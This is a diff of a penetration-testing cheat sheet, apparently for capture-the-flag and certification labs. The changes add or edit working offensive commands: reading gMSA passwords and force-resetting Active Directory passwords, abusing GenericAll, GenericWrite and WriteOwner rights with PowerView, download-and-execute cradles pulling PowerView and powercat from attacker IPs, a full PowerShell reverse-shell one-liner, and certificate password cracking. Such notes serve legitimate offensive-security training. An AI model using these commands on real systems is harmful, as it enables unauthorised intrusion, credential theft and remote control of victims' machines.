@@ -14,7 +14,10 @@ hostname && whoami && type proof.txt && ipconfig /all
 hostname && type proof.txt && ipconfig /all
 
 Windows (Powershell)
+hostname; whoami; type local.txt; ipconfig /all
 hostname; whoami; type proof.txt; ipconfig /all
+hostname; whoami; type user.txt; ipconfig /all
+hostname; whoami; type root.txt; ipconfig /all
 hostname; whoami; type domain_proof.txt; ipconfig /all
 ```
 
@@ -942,7 +945,20 @@ add dc hostname to /etc/hosts
 wmiexec.py -k -no-pass dc.intelligence.htb
 ```
 
-**ReadGMSApassword**
+*ReadGMSApassword Without PowerView
+
+```
+$gmsa = Get-ADServiceAccount -Identity bir-adfs-gmsa -Properties 'msds-managedpassword'
+$mp = $gmsa.'msds-managedpassword'
+$mp1 = ConvertFrom-ADManagedPasswordBlob $mp 
+$user = 'BIR-ADFS-GMSA$' 
+$passwd = $mp1.'CurrentPassword'
+$secpass = ConvertTo-SecureString $passwd -AsPlainText -Force
+$cred = new-object system.management.automation.PSCredential $user,$secpass
+Invoke-Command -computername 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity tristan.davies -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'Password1234!' -force)} -Credential $cred
+```
+
+ReadGMSApassword EXE
 
 ```
 .\GMSAPasswordReader.exe --AccountName 'Target_Account'
@@ -958,18 +974,20 @@ Set-DomainUserPassword -Identity LateralEscUserName -AccountPassword $UserPasswo
 
 *GenericAll*
 ```ps1
-$SecPassword = ConvertTo-SecureString 'CompromisedUserPass' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential $CompromisedUser,$SecPassword
+$CompromisedUserName = 'CompromisedUserName'
+$CompromisedUserPass = ConvertTo-SecureString 'CompromisedUserPass' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential $CompromisedUserName,$CompromisedUserPass
 
-Invoke-Command -computername 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity PrivEscUser -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'password' -force)} -Credential $cred
+Invoke-Command -computername 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity LateralEscUserName -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'password' -force)} -Credential $cred
 ```
 
 *GenericWrite*
 
 *use this for reverseshell using scriptpath=, enumeration, or use serviceprincipalname= for kerberoast*
 ```ps1
-$SecPassword = ConvertTo-SecureString 'CompromisedUserPass' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential $CompromisedUser,$SecPassword
+$CompromisedUserName = 'CompromisedUserName'
+$CompromisedUserPass = ConvertTo-SecureString 'CompromisedUserPass' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential $CompromisedUserName,$CompromisedUserPass
 Set-DomainObject -Credential $Cred -Identity LateralEscUserName -SET @{serviceprincipalname='thescriptkid/thescriptkid'} 
 Get-DomainSPNTicket -Credential $Cred LateralEscUserName | fl
 OR 
@@ -978,8 +996,9 @@ Set-DomainObject -Credential $Cred -Identity LateralEscUserName -SET @{scriptpat
 
 *WriteOwner*
 ```ps1
-$SecPassword = ConvertTo-SecureString 'CompromisedUserPass' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential $CompromisedUser,$SecPassword
+$CompromisedUserName = 'CompromisedUserName'
+$CompromisedUserPass = ConvertTo-SecureString 'CompromisedUserPass' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential $CompromisedUserName,$CompromisedUserPass
 
 Set-DomainObjectOwner -Credential $Cred -Identity "Domain Admins" -OwnerIdentity CompromisedUser
 Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Domain Admins" -PrincipalIdentity CompromisedUser -Rights All
@@ -1390,7 +1409,7 @@ https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70
 Load PowerView.ps1 in memory
 
 ```
-IEX (New-Object Net.Webclient).downloadstring("http://AttackingIP/powerview.ps1")
+IEX (New-Object Net.Webclient).downloadstring("http://AttackingIP/PowerView.ps1")
 ```
 
 Enumerate All but the most interesting group using
@@ -1755,7 +1774,7 @@ powershell -nop -c "\$client = New-Object System.Net.Sockets.TCPClient('192.168.
 
 ### Reverse Powershell using windows command shell
 ```
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.2',53);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.49.192',443);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
 ```
 
 ### CMD Runas
@@ -1768,7 +1787,7 @@ runas.exe /user:IE8WIN7\reg_priv /savecred "cmd.exe /c ping 172.16.0.1"
 ```
 
 ```
-runas.exe /user:IE8WIN7\reg_priv /savecred powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://172.16.0.1/powercat.ps1');powercat -c 172.16.0.1 -p 443 -e powershell.exe"
+runas.exe /user:IE8WIN7\reg_priv /savecred powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.16.2/powercat.ps1');powercat -c 10.10.16.2 -p 443 -e powershell.exe"
 ```
 
 ```
@@ -1788,11 +1807,13 @@ runas.exe /user:IE8WIN7\reg_priv /savecred "cmd.exe /c certutil -urlcache -f htt
 ```
 
 ### Powercat
+
 ```
 powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.49.207/powercat.ps1');powercat -c 192.168.49.207 -p 443 -e cmd.exe"
 ```
+
 ```
-powershell -c IEX(New-Object System.Net.WebClient).DownloadString('http://172.16.0.1/powercat.ps1');powercat -c 172.16.0.1 -p 443 -e powershell.exe
+powershell -c IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.49.192/powercat.ps1');powercat -c 192.168.49.192 -p 443 -e powershell.exe
 ```
 
 ### Invoke-PowerShellTcp.ps1
@@ -2494,3 +2515,8 @@ computer name
 reg.exe query HKLM\SYSTEM\CurrentControlSet\control\computername\activecomputername
 ```
 
+### Crack Password Protected Certificates
+
+```
+crackpkcs12 cert.pfx -d /usr/share/wordlists/rockyou.txt
+```
